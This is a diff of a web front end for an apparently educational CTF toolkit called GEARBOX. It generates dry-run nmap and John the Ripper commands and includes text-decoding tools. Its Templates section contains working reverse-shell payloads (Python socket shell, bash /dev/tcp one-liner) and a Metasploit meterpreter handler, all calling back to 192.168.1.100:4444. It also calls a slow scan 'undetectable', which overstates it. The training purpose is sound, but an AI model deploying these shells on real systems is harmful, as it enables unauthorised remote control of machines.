@@ -2,53 +2,1309 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CTF Toolkit — MVP</title>
+  <title>GEARBOX — Learn & Practice</title>
   <style>
-    :root{--sidebar-w:220px}
-    body{font-family:Inter,system-ui,Segoe UI,Arial;background:#f7f8fb;margin:0}
-    .sidebar{width:var(--sidebar-w);position:fixed;left:0;top:0;bottom:0;background:#2f3640;color:#fff;padding:16px}
-    .main{margin-left:var(--sidebar-w);padding:24px}
-    .card{background:#fff;padding:18px;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,.06);margin-bottom:12px}
-    .icon{width:24px;height:24px;vertical-align:middle;margin-right:8px}
-    .tool-row{display:flex;align-items:center;padding:8px 4px;cursor:pointer}
-    .tool-row:hover{background:rgba(255,255,255,0.03)}
+    /* ANTI-MEME TERMINAL STYLE (DEFAULT) */
+    :root {
+      --sidebar-w: 280px;
+      --matrix-bg: #ffffff;
+      --matrix-dark: #f0f0f0;
+      --matrix-medium: #000000;
+      --matrix-bright: #000000;
+      --text-color: #000000;
+      --accent-color: #000000;
+      --border-color: #000000;
+    }
+    
+    * {
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 16px;
+      line-height: 1.5;
+      color: var(--text-color);
+      background: var(--matrix-bg);
+      margin: 0;
+      padding: 0;
+      position: relative;
+      overflow-x: hidden;
+    }
+    
+    /* DOT MATRIX PAPER BACKGROUND */
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-image: radial-gradient(circle, rgba(0,0,0,0.08) 1px, transparent 1px);
+      background-size: 3px 3px;
+      background-position: 0 0, 1.5px 1.5px;
+      pointer-events: none;
+      z-index: 1;
+    }
+    
+    /* SCAN LINES OVERLAY */
+    body::after {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0,0,0,0.015) 2px,
+        rgba(0,0,0,0.015) 4px
+      );
+      pointer-events: none;
+      z-index: 2;
+    }
+    
+    /* PERFORATION MARKS */
+    .perforation {
+      position: fixed;
+      left: 20px;
+      top: 0;
+      height: 100%;
+      width: 1px;
+      background-image: repeating-linear-gradient(
+        to bottom,
+        transparent,
+        transparent 3px,
+        #999 3px,
+        #999 5px,
+        transparent 5px,
+        transparent 10px
+      );
+      z-index: 3;
+    }
+    
+    /* ANIMATED SCANLINE */
+    .scanline {
+      position: fixed;
+      height: 2px;
+      background: linear-gradient(
+        to bottom,
+        transparent,
+        rgba(0,0,0,0.1),
+        transparent
+      );
+      animation: scan 12s linear infinite;
+      z-index: 4;
+      width: 100%;
+    }
+    
+    @keyframes scan {
+      0% { top: -2px; }
+      100% { top: 100%; }
+    }
+    
+    /* SIDEBAR - MATRIX STYLE */
+    .sidebar {
+      width: var(--sidebar-w);
+      position: fixed;
+      left: 0;
+      top: 0;
+      bottom: 0;
+      background: var(--matrix-dark);
+      color: var(--matrix-bright);
+      padding: 20px;
+      overflow-y: auto;
+      z-index: 10;
+      border-right: 2px solid var(--matrix-medium);
+      box-shadow: 2px 0 10px rgba(0,255,65,0.1);
+    }
+    
+    .sidebar h2 {
+      font-size: 16px;
+      font-weight: bold;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin: 0 0 30px 0;
+      border: 1px solid var(--matrix-medium);
+      padding: 8px 12px;
+      background: var(--matrix-bg);
+      color: var(--matrix-bright);
+      text-shadow: 0 0 2px var(--matrix-bright);
+    }
+    
+    .tool-row {
+      display: flex;
+      align-items: center;
+      padding: 10px 12px;
+      cursor: pointer;
+      margin: 2px 0;
+      border: 1px solid transparent;
+      transition: all 0.2s;
+      font-size: 14px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    
+    .tool-row:hover {
+      background: var(--matrix-medium);
+      color: var(--matrix-bright);
+      border: 1px solid var(--matrix-bright);
+      text-shadow: 0 0 1px var(--matrix-bright);
+    }
+    
+    .tool-row.active {
+      background: var(--matrix-bg);
+      color: var(--matrix-bright);
+      border: 2px solid var(--matrix-bright);
+      font-weight: bold;
+      text-shadow: 0 0 2px var(--matrix-bright);
+    }
+    
+    .icon {
+      margin-right: 8px;
+      font-size: 12px;
+    }
+    
+    /* MAIN CONTENT */
+    .main {
+      margin-left: var(--sidebar-w);
+      padding: 30px;
+      max-width: 600px;
+      position: relative;
+      z-index: 5;
+      margin-right: auto;
+      margin-left: auto;
+      transform: translateX(calc(var(--sidebar-w) / 2));
+    }
+    
+    /* CARDS - MATRIX STYLE */
+    .card {
+      background: var(--matrix-bg);
+      padding: 20px;
+      margin-bottom: 20px;
+      border: 1px solid var(--matrix-medium);
+      position: relative;
+      box-shadow: 0 0 15px rgba(0,255,65,0.1);
+    }
+    
+    .card h1, .card h2 {
+      font-size: 18px;
+      font-weight: bold;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin: 0 0 15px 0;
+      border-bottom: 1px solid var(--matrix-medium);
+      padding-bottom: 8px;
+      color: var(--matrix-bright);
+      text-shadow: 0 0 2px var(--matrix-bright);
+    }
+    
+    .card h3 {
+      font-size: 14px;
+      font-weight: bold;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin: 15px 0 10px 0;
+      color: var(--matrix-bright);
+      text-shadow: 0 0 1px var(--matrix-bright);
+    }
+    
+    .card p {
+      font-size: 14px;
+      line-height: 1.5;
+      margin: 10px 0;
+      color: var(--matrix-bright);
+    }
+    
+    /* SECTIONS */
+    .section {
+      display: none;
+    }
+    
+    .section.active {
+      display: block;
+    }
+    
+    /* PRESET BUTTONS - MATRIX STYLE */
+    .preset-btn {
+      background: var(--matrix-bg);
+      border: 1px solid var(--matrix-medium);
+      padding: 8px 12px;
+      margin: 4px;
+      cursor: pointer;
+      transition: all 0.2s;
+      display: inline-block;
+      min-width: 120px;
+      text-align: center;
+      font-family: 'Courier New', monospace;
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: var(--matrix-bright);
+    }
+    
+    .preset-btn:hover {
+      background: var(--matrix-medium);
+      color: var(--matrix-bright);
+      border: 1px solid var(--matrix-bright);
+      text-shadow: 0 0 1px var(--matrix-bright);
+      box-shadow: 0 0 5px rgba(0,255,65,0.2);
+    }
+    
+    .preset-btn.selected {
+      background: var(--matrix-medium);
+      color: var(--matrix-bright);
+      border: 1px solid var(--matrix-bright);
+      font-weight: bold;
+      text-shadow: 0 0 2px var(--matrix-bright);
+      box-shadow: 0 0 8px rgba(0,255,65,0.3);
+    }
+    
+    /* INPUT GROUPS */
+    .input-group {
+      margin: 15px 0;
+    }
+    
+    .input-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+      font-size: 13px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    
+    .input-group input, 
+    .input-group select, 
+    .input-group textarea {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid var(--matrix-medium);
+      background: var(--matrix-bg);
+      color: var(--matrix-bright);
+      font-family: 'Courier New', monospace;
+      font-size: 14px;
+    }
+    
+    .input-group input:focus, 
+    .input-group select:focus, 
+    .input-group textarea:focus {
+      outline: none;
+      border: 2px solid var(--matrix-bright);
+      box-shadow: 0 0 5px rgba(0,255,65,0.2);
+    }
+    
+    /* BUTTONS - MATRIX STYLE */
+    .btn {
+      background: var(--matrix-bg);
+      color: var(--matrix-bright);
+      border: 1px solid var(--matrix-medium);
+      padding: 10px 18px;
+      cursor: pointer;
+      font-family: 'Courier New', monospace;
+      font-size: 14px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      transition: all 0.2s;
+      margin: 5px;
+    }
+    
+    .btn:hover {
+      background: var(--matrix-medium);
+      color: var(--matrix-bright);
+      border: 1px solid var(--matrix-bright);
+      text-shadow: 0 0 2px var(--matrix-bright);
+      box-shadow: 0 0 5px rgba(0,255,65,0.2);
+    }
+    
+    .btn-secondary {
+      background: var(--matrix-dark);
+      color: var(--matrix-bright);
+      border: 1px solid var(--matrix-medium);
+    }
+    
+    .btn-secondary:hover {
+      background: var(--matrix-medium);
+      color: var(--matrix-bright);
+      border: 1px solid var(--matrix-bright);
+      text-shadow: 0 0 2px var(--matrix-bright);
+    }
+    
+    /* OUTPUT - MATRIX STYLE */
+    .output {
+      background: var(--matrix-bg);
+      color: var(--matrix-bright);
+      padding: 15px;
+      border: 1px solid var(--matrix-medium);
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      white-space: pre-wrap;
+      max-height: 400px;
+      overflow-y: auto;
+      margin-top: 15px;
+      line-height: 1.4;
+      box-shadow: inset 0 0 5px rgba(0,255,65,0.05);
+      text-shadow: 0 0 1px var(--matrix-bright);
+    }
+    
+    /* EXPLANATION BOXES */
+    .explanation {
+      background: var(--matrix-dark);
+      border: 1px solid var(--matrix-medium);
+      padding: 12px;
+      margin: 15px 0;
+      position: relative;
+      box-shadow: 0 0 10px rgba(0,255,65,0.1);
+    }
+    
+    .explanation h4 {
+      margin: 0 0 8px 0;
+      font-size: 13px;
+      font-weight: bold;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: var(--matrix-bright);
+      text-shadow: 0 0 1px var(--matrix-bright);
+    }
+    
+    .explanation p {
+      font-size: 13px;
+      margin: 5px 0;
+      color: var(--matrix-bright);
+    }
+    
+    /* LAB MODE INDICATOR */
+    .lab-mode {
+      position: absolute;
+      bottom: 20px;
+      left: 20px;
+      right: 20px;
+      background: var(--matrix-dark);
+      border: 1px solid var(--matrix-medium);
+      padding: 8px 12px;
+      text-align: center;
+      font-size: 10px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: var(--matrix-bright);
+    }
+    
+    .lab-mode.enabled {
+      background: var(--matrix-medium);
+      color: var(--matrix-bright);
+      border: 1px solid var(--matrix-bright);
+      text-shadow: 0 0 2px var(--matrix-bright);
+      box-shadow: 0 0 5px rgba(0,255,65,0.2);
+    }
+    
+    /* TYPEWRITER CURSOR */
+    .cursor {
+      display: inline-block;
+      width: 8px;
+      height: 16px;
+      background: var(--matrix-bright);
+      animation: blink 1s infinite;
+      margin-left: 2px;
+      box-shadow: 0 0 2px var(--matrix-bright);
+    }
+    
+    @keyframes blink {
+      0%, 49% { opacity: 1; }
+      50%, 100% { opacity: 0; }
+    }
+    
+    /* ASCII DIVIDERS */
+    .ascii-divider {
+      text-align: center;
+      font-size: 12px;
+      margin: 15px 0;
+      color: var(--matrix-medium);
+      text-shadow: 0 0 1px var(--matrix-bright);
+    }
+    
+    /* STATUS INDICATORS */
+    .status-indicator {
+      display: inline-block;
+      padding: 2px 6px;
+      border: 1px solid var(--matrix-medium);
+      font-size: 10px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-left: 8px;
+      color: var(--matrix-bright);
+      background: var(--matrix-dark);
+    }
+    
+    /* LISTS */
+    ul, ol {
+      font-size: 14px;
+      line-height: 1.5;
+      color: var(--matrix-bright);
+    }
+    
+    li {
+      margin: 5px 0;
+    }
+    
+    /* CODE ELEMENTS */
+    code {
+      background: var(--matrix-dark);
+      color: var(--matrix-bright);
+      padding: 2px 4px;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      border: 1px solid var(--matrix-medium);
+    }
+    
+    /* SMALL TEXT */
+    small {
+      font-size: 12px;
+      color: var(--matrix-medium);
+    }
+    
+    /* RADAR SCANNING ANIMATION - WIREFRAME STYLE */
+    .radar-container {
+      position: relative;
+      width: 80px;
+      height: 80px;
+      margin: 20px auto 10px auto;
+      border: 1px solid var(--matrix-medium);
+      border-radius: 50%;
+      background: transparent;
+    }
+    
+    .radar-sweep {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 50%;
+      height: 1px;
+      background: var(--matrix-bright);
+      transform-origin: 0 0;
+      animation: radar-sweep 4s linear infinite;
+    }
+    
+    @keyframes radar-sweep {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .radar-center {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 2px;
+      height: 2px;
+      background: var(--matrix-bright);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+    }
+    
+    .radar-rings {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+    }
+    
+    .radar-rings::before,
+    .radar-rings::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      border: 1px solid var(--matrix-medium);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+    }
+    
+    .radar-rings::before {
+      width: 66%;
+      height: 66%;
+    }
+    
+    .radar-rings::after {
+      width: 33%;
+      height: 33%;
+    }
+    
+    .radar-grid {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+    }
+    
+    .radar-grid::before,
+    .radar-grid::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      background: var(--matrix-medium);
+    }
+    
+    .radar-grid::before {
+      width: 1px;
+      height: 100%;
+      transform: translate(-50%, -50%);
+    }
+    
+    .radar-grid::after {
+      width: 100%;
+      height: 1px;
+      transform: translate(-50%, -50%);
+    }
+    
+    /* SETTINGS BUTTON */
+    .settings-btn {
+      background: var(--matrix-bg);
+      border: 1px solid var(--matrix-medium);
+      color: var(--matrix-bright);
+      padding: 8px 12px;
+      margin: 10px 0;
+      cursor: pointer;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      transition: all 0.2s;
+      width: 100%;
+    }
+    
+    .settings-btn:hover {
+      background: var(--matrix-medium);
+      border: 1px solid var(--matrix-bright);
+      text-shadow: 0 0 2px var(--matrix-bright);
+    }
+    
+    /* HACK THE PLANET TEXT */
+    .hack-text {
+      text-align: center;
+      font-size: 8px;
+      color: var(--matrix-medium);
+      margin-top: 5px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    
+    /* RESPONSIVE */
+    @media (max-width: 768px) {
+      body { font-size: 14px; }
+      .main { padding: 20px; }
+      .sidebar { width: 240px; }
+    }
   </style>
 </head>
 <body>
-  <div class="sidebar">
-    <h3>CTF Toolkit</h3>
-    <div class="tool-row"><img class="icon" src="icons/forensics.svg"> Forensics</div>
-    <div class="tool-row"><img class="icon" src="icons/recon.svg"> Recon</div>
-    <div class="tool-row"><img class="icon" src="icons/network.svg"> Network</div>
-    <div class="tool-row"><img class="icon" src="icons/password.svg"> Passwords</div>
-    <div class="tool-row"><img class="icon" src="icons/templates.svg"> Templates</div>
-    <div class="tool-row"><img class="icon" src="icons/playground.svg"> Playground</div>
-    <div style="position:absolute;bottom:16px;left:16px;font-size:12px;color:#cbd3db">Lab Mode: off</div>
-  </div>
+  <!-- TERMINAL EFFECTS -->
+  <div class="perforation"></div>
+  <div class="scanline"></div>
+  
+        <div class="sidebar">
+          <h2>GEARBOX<span class="cursor"></span></h2>
+          <div class="tool-row active" onclick="showSection('overview')">
+            <span class="icon">[01]</span> OVERVIEW
+          </div>
+          <div class="tool-row" onclick="showSection('network')">
+            <span class="icon">[02]</span> NETWORK SCAN
+          </div>
+          <div class="tool-row" onclick="showSection('passwords')">
+            <span class="icon">[03]</span> PASSWORD CRACK
+          </div>
+          <div class="tool-row" onclick="showSection('forensics')">
+            <span class="icon">[04]</span> FORENSICS
+          </div>
+          <div class="tool-row" onclick="showSection('templates')">
+            <span class="icon">[05]</span> TEMPLATES
+          </div>
+          <div class="tool-row" onclick="showSection('playground')">
+            <span class="icon">[06]</span> PLAYGROUND
+          </div>
+          <div class="tool-row" onclick="showSettings()">
+            <span class="icon">[07]</span> SETTINGS
+          </div>
+          
+          <div class="lab-mode" id="labMode">
+            <div>[SAFE] LAB MODE: OFF</div>
+            <div style="font-size:10px;margin-top:4px;">DRY-RUN ONLY</div>
+          </div>
+          
+          <div class="radar-container">
+            <div class="radar-grid"></div>
+            <div class="radar-rings"></div>
+            <div class="radar-sweep"></div>
+            <div class="radar-center"></div>
+          </div>
+          
+          <div class="hack-text">HACK THE PLANET!</div>
+        </div>
+  
   <div class="main">
-    <div class="card"><h2>Overview</h2><p>Welcome — use the sidebar to pick a tool.</p></div>
-    <div class="card">
-      <h3>Nmap Builder (dry-run)</h3>
-      <input id="n_target" placeholder="target (ip/cidr)" style="width:300px">
-      <select id="n_preset"><option>quick</option><option>full</option></select>
-      <input id="n_extra" placeholder="extra args">
-      <button onclick="nmapRun()">Build</button>
-      <pre id="nmap_out"></pre>
+    <!-- Overview Section -->
+    <div id="overview" class="section active">
+      <div class="card">
+        <h1>GEARBOX — LEARN & PRACTICE<span class="cursor"></span></h1>
+        
+        <div class="ascii-divider">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>
+        
+        <p>WELCOME TO YOUR <strong>EDUCATIONAL GEARBOX</strong>! THIS IS A SAFE LEARNING ENVIRONMENT WHERE YOU CAN PRACTICE CYBERSECURITY SKILLS WITHOUT BREAKING ANYTHING.</p>
+        
+        <div class="explanation">
+          <h4>[01] WHAT THIS TOOL DOES</h4>
+          <p>GEARBOX HELPS YOU LEARN CYBERSECURITY BY GENERATING COMMANDS FOR COMMON TOOLS LIKE NMAP (NETWORK SCANNING) AND JOHN THE RIPPER (PASSWORD CRACKING). EVERYTHING RUNS IN <strong>DRY-RUN MODE BY DEFAULT</strong> - YOU'LL SEE THE COMMANDS BUT THEY WON'T ACTUALLY EXECUTE.</p>
+        </div>
+        
+        <div class="explanation">
+          <h4>[02] SAFETY FIRST</h4>
+          <p><strong>LAB MODE IS OFF BY DEFAULT</strong> - THIS MEANS ALL TOOLS RUN IN SAFE DRY-RUN MODE. YOU'LL LEARN HOW THE COMMANDS WORK WITHOUT ACTUALLY SCANNING OR ATTACKING ANYTHING. PERFECT FOR BEGINNERS!</p>
+        </div>
+        
+        <div class="explanation">
+          <h4>[03] GETTING STARTED</h4>
+          <p>USE THE SIDEBAR TO EXPLORE DIFFERENT TOOLS. EACH TOOL HAS BEGINNER-FRIENDLY EXPLANATIONS AND PRESET OPTIONS TO HELP YOU UNDERSTAND WHAT EACH COMMAND DOES.</p>
+        </div>
+        
+        <div class="ascii-divider">▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀</div>
+      </div>
+    </div>
+    
+    <!-- Network Scanning Section -->
+    <div id="network" class="section">
+      <div class="card">
+        <h2>NETWORK SCANNING WITH NMAP<span class="cursor"></span></h2>
+        
+        <div class="ascii-divider">[================]</div>
+        
+        <p>NMAP IS LIKE A <strong>DIGITAL STETHOSCOPE</strong> FOR NETWORKS. IT HELPS YOU DISCOVER WHAT SERVICES ARE RUNNING ON TARGET SYSTEMS.</p>
+        
+        <div class="explanation">
+          <h4>[01] WHAT NMAP DOES</h4>
+          <p>NMAP SENDS SPECIAL PACKETS TO TARGET SYSTEMS AND ANALYZES THE RESPONSES TO DETERMINE WHAT PORTS ARE OPEN, WHAT SERVICES ARE RUNNING, AND EVEN WHAT OPERATING SYSTEM IS BEING USED.</p>
+        </div>
+        
+        <div class="input-group">
+          <label>[TARGET] IP ADDRESS OR HOSTNAME</label>
+          <input id="nmap_target" placeholder="E.G., 192.168.1.1 OR SCANME.NMAP.ORG" value="scanme.nmap.org">
+        </div>
+        
+        <div class="input-group">
+          <label>[SCAN MODE] SPEED & STEALTH</label>
+          <div>
+            <div class="preset-btn selected" onclick="selectPreset('stealth')" id="preset-stealth">
+              [STEALTH] SNEAKY MODE<br><small>SLOW BUT UNDETECTABLE</small>
+            </div>
+            <div class="preset-btn" onclick="selectPreset('balanced')" id="preset-balanced">
+              [BALANCED] NORMAL MODE<br><small>GOOD SPEED, MODERATE DETECTION</small>
+            </div>
+            <div class="preset-btn" onclick="selectPreset('aggressive')" id="preset-aggressive">
+              [YEET] AGGRESSIVE MODE<br><small>FAST BUT OBVIOUS</small>
+            </div>
+          </div>
+        </div>
+        
+        <button class="btn" onclick="runNmap()">[EXECUTE] GENERATE NMAP COMMAND</button>
+        <button class="btn btn-secondary" onclick="clearOutput()">[CLEAR] RESET OUTPUT</button>
+        
+        <div id="nmap_output" class="output" style="display:none;margin-top:20px"></div>
+      </div>
+    </div>
+    
+    <!-- Password Cracking Section -->
+    <div id="passwords" class="section">
+      <div class="card">
+        <h2>🔐 Password Cracking with John the Ripper</h2>
+        <p>John the Ripper is like a <strong>digital locksmith</strong> that tries different keys (passwords) to unlock hashed passwords.</p>
+        
+        <div class="explanation">
+          <h4>🔑 How Password Cracking Works</h4>
+          <p>When you create an account, your password is converted to a "hash" (a scrambled version). John tries millions of common passwords to see if any match the hash.</p>
+        </div>
+        
+        <div class="input-group">
+          <label>📁 Hash File</label>
+          <input type="file" id="john_file" accept=".txt,.hash">
+          <small>Upload a file containing password hashes (one per line)</small>
+        </div>
+        
+        <div class="input-group">
+          <label>🎯 Attack Strategy</label>
+          <div>
+            <div class="preset-btn selected" onclick="selectJohnPreset('wordlist')" id="john-preset-wordlist">
+              📚 Wordlist Attack<br><small>Try common passwords</small>
+            </div>
+            <div class="preset-btn" onclick="selectJohnPreset('incremental')" id="john-preset-incremental">
+              🔢 Brute Force<br><small>Try all combinations</small>
+            </div>
+            <div class="preset-btn" onclick="selectJohnPreset('hybrid')" id="john-preset-hybrid">
+              🎯 Hybrid Attack<br><small>Wordlist + variations</small>
+            </div>
+          </div>
+        </div>
+        
+        <button class="btn" onclick="runJohn()">🔓 Generate John Command</button>
+        <button class="btn btn-secondary" onclick="clearOutput()">🗑️ Clear</button>
+        
+        <div id="john_output" class="output" style="display:none;margin-top:20px"></div>
+      </div>
+    </div>
+    
+    <!-- Forensics Section -->
+    <div id="forensics" class="section">
+      <div class="card">
+        <h2>🔍 Digital Forensics Tools</h2>
+        <p>Forensics tools help you <strong>analyze files and data</strong> to find hidden information, like a digital detective!</p>
+        
+        <div class="explanation">
+          <h4>🕵️ What Forensics Reveals</h4>
+          <p>Files often contain hidden data, metadata, or encoded information. These tools help you extract and decode that information.</p>
+        </div>
+        
+        <div class="input-group">
+          <label>📝 Text to Analyze</label>
+          <textarea id="forensics_input" placeholder="Paste suspicious text, encoded data, or file contents here..." rows="6" style="width:100%;padding:12px;border:2px solid #e2e8f0;border-radius:8px;font-family:monospace"></textarea>
+        </div>
+        
+        <button class="btn" onclick="analyzeForensics()">🔍 Analyze Text</button>
+        <button class="btn btn-secondary" onclick="clearOutput()">🗑️ Clear</button>
+        
+        <div id="forensics_output" class="output" style="display:none;margin-top:20px"></div>
+      </div>
+    </div>
+    
+    <!-- Templates Section -->
+    <div id="templates" class="section">
+      <div class="card">
+        <h2>📋 Ready-to-Use Templates</h2>
+        <p>Pre-built scripts and configurations for common CTF scenarios.</p>
+        
+        <div class="input-group">
+          <label>🎯 Template Type</label>
+          <select id="template_type" onchange="generateTemplate()">
+            <option value="">Select a template...</option>
+            <option value="metasploit_handler">Metasploit Handler</option>
+            <option value="python_reverse_shell">Python Reverse Shell</option>
+            <option value="bash_one_liner">Bash One-liner</option>
+          </select>
+        </div>
+        
+        <div id="template_output" class="output" style="display:none;margin-top:20px"></div>
+      </div>
+    </div>
+    
+    <!-- Playground Section -->
+    <div id="playground" class="section">
+      <div class="card">
+        <h2>🎮 Interactive Playground</h2>
+        <p>Experiment with different tools and see how they work together.</p>
+        
+        <div class="explanation">
+          <h4>🧪 Try These Challenges</h4>
+          <p>Practice with these common CTF scenarios:</p>
+          <ul>
+            <li>Decode this: <code>aGVsbG8gd29ybGQ=</code></li>
+            <li>Find the flag in: <code>FLAG{hidden_in_plain_sight}</code></li>
+            <li>Analyze this hex: <code>48656c6c6f20576f726c64</code></li>
+          </ul>
+        </div>
+        
+        <div class="input-group">
+          <label>🎯 Your Input</label>
+          <textarea id="playground_input" placeholder="Try pasting encoded data, suspicious text, or anything you want to analyze..." rows="4" style="width:100%;padding:12px;border:2px solid #e2e8f0;border-radius:8px;font-family:monospace"></textarea>
+        </div>
+        
+        <button class="btn" onclick="playgroundAnalyze()">🎮 Analyze Everything</button>
+        <button class="btn btn-secondary" onclick="clearOutput()">🗑️ Clear</button>
+        
+        <div id="playground_output" class="output" style="display:none;margin-top:20px"></div>
+      </div>
     </div>
   </div>
 
   <script>
-  async function api(path, body){
-    const res = await fetch(path, {method:"POST", headers:{"content-type":"application/json"}, body: JSON.stringify(body)});
-    return res.json();
+  // Global state
+  let currentPreset = 'stealth';
+  let currentJohnPreset = 'wordlist';
+  
+  // Sidebar navigation
+  function showSection(sectionId) {
+    // Hide all sections
+    document.querySelectorAll('.section').forEach(section => {
+      section.classList.remove('active');
+    });
+    
+    // Remove active class from all sidebar items
+    document.querySelectorAll('.tool-row').forEach(row => {
+      row.classList.remove('active');
+    });
+    
+    // Show selected section
+    document.getElementById(sectionId).classList.add('active');
+    
+    // Add active class to clicked sidebar item
+    event.target.closest('.tool-row').classList.add('active');
   }
-  async function nmapRun(){
-    const t = document.getElementById("n_target").value;
-    const p = document.getElementById("n_preset").value;
-    const e = document.getElementById("n_extra").value;
-    const r = await api("/api/run/nmap", {target:t,preset:p,extra:e,dry_run:true});
-    document.getElementById("nmap_out").textContent = JSON.stringify(r, null, 2);
+  
+  // Nmap preset selection
+  function selectPreset(preset) {
+    currentPreset = preset;
+    document.querySelectorAll('.preset-btn').forEach(btn => {
+      btn.classList.remove('selected');
+    });
+    document.getElementById(`preset-${preset}`).classList.add('selected');
   }
+  
+  // John preset selection
+  function selectJohnPreset(preset) {
+    currentJohnPreset = preset;
+    document.querySelectorAll('#passwords .preset-btn').forEach(btn => {
+      btn.classList.remove('selected');
+    });
+    document.getElementById(`john-preset-${preset}`).classList.add('selected');
+  }
+  
+  // API helper
+  async function api(path, body) {
+    try {
+      const res = await fetch(path, {
+        method: "POST", 
+        headers: {"content-type": "application/json"}, 
+        body: JSON.stringify(body)
+      });
+      return await res.json();
+    } catch (error) {
+      return { error: `Connection failed: ${error.message}` };
+    }
+  }
+  
+  // Nmap function
+  async function runNmap() {
+    const target = document.getElementById("nmap_target").value;
+    if (!target) {
+      alert("Please enter a target!");
+      return;
+    }
+    
+    const output = document.getElementById("nmap_output");
+    output.style.display = "block";
+    output.textContent = "Generating Nmap command...";
+    
+    // Map presets to actual nmap arguments
+    const presetMap = {
+      'stealth': { preset: 'quick', extra: '-sS -T2' },
+      'balanced': { preset: 'quick', extra: '-sS -T4' },
+      'aggressive': { preset: 'full', extra: '-sS -A -T5' }
+    };
+    
+    const config = presetMap[currentPreset];
+    const result = await api("/api/run/nmap", {
+      target: target,
+      preset: config.preset,
+      extra: config.extra,
+      dry_run: true
+    });
+    
+    if (result.error) {
+      output.textContent = `❌ Error: ${result.error}`;
+    } else {
+      const explanation = getNmapExplanation(currentPreset, config);
+      output.textContent = `✅ Generated Nmap Command:\n\n${result.cmd}\n\n${explanation}`;
+    }
+  }
+  
+  // John function
+  async function runJohn() {
+    const fileInput = document.getElementById("john_file");
+    if (!fileInput.files[0]) {
+      alert("Please select a hash file!");
+      return;
+    }
+    
+    const output = document.getElementById("john_output");
+    output.style.display = "block";
+    output.textContent = "Generating John command...";
+    
+    // Upload file first
+    const formData = new FormData();
+    formData.append("file", fileInput.files[0]);
+    
+    try {
+      const uploadRes = await fetch("/api/upload/hashfile", {
+        method: "POST", 
+        body: formData
+      });
+      const uploadData = await uploadRes.json();
+      
+      if (!uploadData.ok) {
+        output.textContent = `❌ Upload failed: ${uploadData.error}`;
+        return;
+      }
+      
+      // Generate John command
+      const result = await api("/api/run/john", {
+        hashfile_path: uploadData.path,
+        dry_run: true
+      });
+      
+      if (result.error) {
+        output.textContent = `❌ Error: ${result.error}`;
+      } else {
+        const explanation = getJohnExplanation(currentJohnPreset);
+        output.textContent = `✅ Generated John Command:\n\n${result.cmd}\n\n${explanation}`;
+      }
+    } catch (error) {
+      output.textContent = `❌ Error: ${error.message}`;
+    }
+  }
+  
+  // Forensics analysis
+  async function analyzeForensics() {
+    const input = document.getElementById("forensics_input").value;
+    if (!input.trim()) {
+      alert("Please enter some text to analyze!");
+      return;
+    }
+    
+    const output = document.getElementById("forensics_output");
+    output.style.display = "block";
+    output.textContent = "Analyzing text...";
+    
+    // Simple client-side analysis for now
+    const results = analyzeText(input);
+    output.textContent = results;
+  }
+  
+  // Template generation
+  function generateTemplate() {
+    const type = document.getElementById("template_type").value;
+    if (!type) return;
+    
+    const output = document.getElementById("template_output");
+    output.style.display = "block";
+    
+    const templates = {
+      'metasploit_handler': `use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z`,
+      'python_reverse_shell': `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
+      'bash_one_liner': `bash -i >& /dev/tcp/192.168.1.100/4444 0>&1`
+    };
+    
+    output.textContent = `📋 ${type.replace('_', ' ').toUpperCase()} Template:\n\n${templates[type]}\n\n⚠️  Remember: Only use these on systems you own or have permission to test!`;
+  }
+  
+  // Playground analysis
+  function playgroundAnalyze() {
+    const input = document.getElementById("playground_input").value;
+    if (!input.trim()) {
+      alert("Please enter some text to analyze!");
+      return;
+    }
+    
+    const output = document.getElementById("playground_output");
+    output.style.display = "block";
+    
+    const results = analyzeText(input);
+    output.textContent = `🎮 Playground Analysis Results:\n\n${results}`;
+  }
+  
+  // Text analysis function
+  function analyzeText(text) {
